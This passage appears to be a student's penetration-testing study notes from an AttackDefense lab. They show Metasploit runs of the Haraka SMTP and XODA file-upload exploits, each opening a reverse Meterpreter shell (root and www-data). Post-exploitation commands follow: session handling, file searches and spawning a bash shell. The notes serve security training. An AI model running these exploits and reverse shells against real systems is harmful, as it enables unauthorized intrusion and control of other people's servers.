   SRVPORT     9898                     yes       The local port to listen on.
   SSL         false                    no        Negotiate SSL for incoming connections
   SSLCert                              no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                              no        The URI to use for this exploit (default is random)
   email_from  foo@example.com          yes       Address to send from
   email_to    root@attackdefense.test  yes       Email to send to, must be accepted by the server
   rhost       192.177.133.3            yes       Target server
   rport       25                       yes       Target server port


Payload options (linux/x64/meterpreter_reverse_http):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.177.133.2    yes       The local listener hostname
   LPORT  8080             yes       The local listener port
   LURI                    no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   linux x64


msf5 exploit(linux/smtp/haraka) > run

[*] Started HTTP reverse handler on http://192.177.133.2:8080
[*] Exploiting...
[*] Using URL: http://0.0.0.0:9898/8FZHZIQxW
[*] Local IP: http://10.1.0.28:9898/8FZHZIQxW
[*] Sending mail to target server...
[*] Client 192.177.133.3 (Wget/1.17.1 (linux-gnu)) requested /8FZHZIQxW
[*] Sending payload to 192.177.133.3 (Wget/1.17.1 (linux-gnu))
[*] http://192.177.133.2:8080 handling request from 192.177.133.3; (UUID: dugvkmg1) Redirecting stageless connection from /pcdQeYPzzlbrPe0_joDxBwQokuNwfl4-gRgqe54wN9Xn_S3GJE4p95YJEcMTPW81ImKTUEDG5JuEbQDWiSa84svWw-Sf5luE with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[*] http://192.177.133.2:8080 handling request from 192.177.133.3; (UUID: dugvkmg1) Attaching orphaned/stageless session...
[*] Meterpreter session 1 opened (192.177.133.2:8080 -> 192.177.133.3:33640) at 2024-02-02 16:37:15 +0000
[+] Triggered bug in target server (plugin timeout)
[*] Command Stager progress - 100.00% done (115/115 bytes)
[*] Server stopped.

meterpreter > sysinfo
Computer     : 192.177.133.3
OS           : Ubuntu 16.04 (Linux 5.4.0-152-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
```



---

### Post Exploitation Fundamentals

+ Post exploitation refers to the actions performed on the target system after initial access has been obtained.
+ The post exploitation phase of a penetration test consists of various techniques like:
  + Local Enumeration
  + Privilege Escalation
  + Dumping Hashes
  + Establishing Persistence
  + Clearing Your Tracks
  + Pivoting



#### Meterpreter Fundamentals    

+ The Meterpreter (Meta-Interpreter) payload is an advanced multi-functional payload that operates via DLL injection and is executed in memory on the target system, consequently making it difficult to detect.
+ It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more.
+ Meterpreter also allows us to load custom script and plugins dynamically.
+ MSF provides us with various types of meterpreter payloads that can be used based on the target environment and the OS architecture.



```bash
root@attackdefense:~# nmap 192.180.12.3 -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-02 16:54 UTC
Nmap scan report for target-1 (192.180.12.3)
Host is up (0.000013s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
MAC Address: 02:42:C0:B4:0C:03 (Unknown)
```





```bash
msf5 > db_status 
[*] Connected to msf. Connection type: postgresql.
msf5 > workspace -a meterpreter
[*] Added workspace: meterpreter
[*] Workspace: meterpreter
msf5 > setg RHOSTS root@attackdefense:~# nmap 192.180.12.3 -sV
RHOSTS => root@attackdefense:~# nmap 192.180.12.3 -sV
msf5 > Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-02 16:54 UTC
[-] Unknown command: Starting.
msf5 > Nmap scan report for target-1 (192.180.12.3)
[-] Unknown command: Nmap.
msf5 > Host is up (0.000013s latency).
[-] Unknown command: Host.
msf5 > Not shown: 998 closed ports
^CInterrupt: use the 'exit' command to quit
msf5 > setg RHOSTS 192.180.12.3
RHOSTS => 192.180.12.3
msf5 > db_nmap -sV 192.180.12.3
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-02 16:55 UTC
[*] Nmap: Nmap scan report for target-1 (192.180.12.3)
[*] Nmap: Host is up (0.0000090s latency).
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
[*] Nmap: 3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
[*] Nmap: MAC Address: 02:42:C0:B4:0C:03 (Unknown)
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds
msf5 > hosts 

Hosts
=====

address       mac                name      os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----      -------  ---------  -----  -------  ----  --------
192.180.12.3  02:42:c0:b4:0c:03  target-1  Linux                      server         

msf5 > services 
Services
========

host          port  proto  name   state  info
----          ----  -----  ----   -----  ----
192.180.12.3  80    tcp    http   open   Apache httpd 2.4.7 (Ubuntu)
192.180.12.3  3306  tcp    mysql  open   MySQL 5.5.47-0ubuntu0.14.04.1

msf5 > curl http://192.180.12.3
[*] exec: curl http://192.180.12.3

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1315  100  1315    0     0  1284k      0 --:--:-- --:--:-- --:--:-- 1284k
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <title>XODA</title>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                        <script language="JavaScript" type="text/javascript">
                        //<![CDATA[
                        var countselected=0;
                        function stab(id){var _10=new Array();for(i=0;i<_10.length;i++){document.getElementById(_10[i]).className="tab";}document.getElementById(id).className="stab";}var allfiles=new Array('');
                        //]]>
                </script>
                <script language="JavaScript" type="text/javascript" src="/js/xoda.js"></script>
                <script language="JavaScript" type="text/javascript" src="/js/sorttable.js"></script>
                <link rel="stylesheet" href="/style.css" type="text/css" />
</head>

<body onload="document.lform.username.focus();">
        <div id="top">
                <a href="/" title="XODA"><span style="color: #56a;">XO</span><span style="color: #fa5;">D</span><span style="color: #56a;">A</span></a>
                        </div>
        <form method="post" action="/?log_in" name="lform" id="login">
                <p>Username:&nbsp;<input type="text" id="un" name="username" /></p>
                <p>Password:&nbsp;<input type="password" name="password" /></p>
                <p><input type="submit" name="submit" value="login" /></p>
        </form>
</body>
</html>
        msf5 > search xoda

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   1  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability


msf5 > use exploit/unix/webapp/xoda_file_upload
msf5 exploit(unix/webapp/xoda_file_upload) > options 

Module options (exploit/unix/webapp/xoda_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.180.12.3     yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /xoda/           yes       The base path to the web application
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   XODA 0.4.5


msf5 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /     <<<<<<====== because xoda was running on the / not /xoda
TARGETURI => /
msf5 exploit(unix/webapp/xoda_file_upload) > run

[*] Started reverse TCP handler on 192.180.12.2:4444 
[*] Sending PHP payload (jncFnWHkJjatDJ.php)
[*] Executing PHP payload (jncFnWHkJjatDJ.php)
[*] Sending stage (38247 bytes) to 192.180.12.3
[*] Meterpreter session 1 opened (192.180.12.2:4444 -> 192.180.12.3:41958) at 2024-02-02 16:57:39 +0000
[!] Deleting jncFnWHkJjatDJ.php

meterpreter > sysinfo
Computer    : victim-1
OS          : Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data (33)
```



**view list of sessions**

```bash
Background session 1? [y/N]  
msf5 exploit(unix/webapp/xoda_file_upload) > sessions 

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         meterpreter php/linux  www-data (33) @ victim-1  192.180.12.2:4444 -> 192.180.12.3:41958 (192.180.12.3)
```



**execute commands to specific session**

```bash
msf5 exploit(unix/webapp/xoda_file_upload) > sessions -C sysinfo -i 1
[*] Running 'sysinfo' on meterpreter session 1 (192.180.12.3)
Computer    : victim-1
OS          : Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64
Meterpreter : php/linux
```



**kill specific session**

```bash
msf5 exploit(unix/webapp/xoda_file_upload) > sessions -K
```



**kill all sessions**

```bash
msf5 exploit(unix/webapp/xoda_file_upload) > sessions -k 1
```



**provide a name to a session**

```bash
msf5 exploit(unix/webapp/xoda_file_upload) > sessions 

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         meterpreter php/linux  www-data (33) @ victim-1  192.180.12.2:4444 -> 192.180.12.3:41958 (192.180.12.3)

msf5 exploit(unix/webapp/xoda_file_upload) > sessions -n xoda -i 1
[*] Session 1 named to xoda
msf5 exploit(unix/webapp/xoda_file_upload) > sessions 

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1   xoda  meterpreter php/linux  www-data (33) @ victim-1  192.180.12.2:4444 -> 192.180.12.3:41958 (192.180.12.3)
```



**edit a file**

```bash
meterpreter > edit flag1
```



**get environment variable**

```bash
meterpreter > getenv PATH

Environment Variables
=====================

Variable  Value
--------  -----
PATH      /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```



**search about file in specific directory**

```bash
meterpreter > search -d /usr/bin -f *backdoor*
Found 1 result...
    /usr/bin\backdoor (66 bytes)
```



**search about specific extension**

```bash
meterpreter > search  -f *.php
Found 5 results...
    .\config.php (1284 bytes)
    .\functions.php (40563 bytes)
    .\index.php (57739 bytes)
    .\phpinfo.php (19 bytes)
    .\zipstream.php (18850 bytes)
```



**from meterpreter to native shell**

```bash
meterpreter > shell
Process 861 created.
Channel 5 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/bash -i
bash: cannot set terminal process group (478): Inappropriate ioctl for device
bash: no job control in this shell
www-data@victim-1:/app/Secret Files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



**view list of processes**

```bash
meterpreter > ps
```



#### Upgrading Command Shells To Meterpreter Shells    
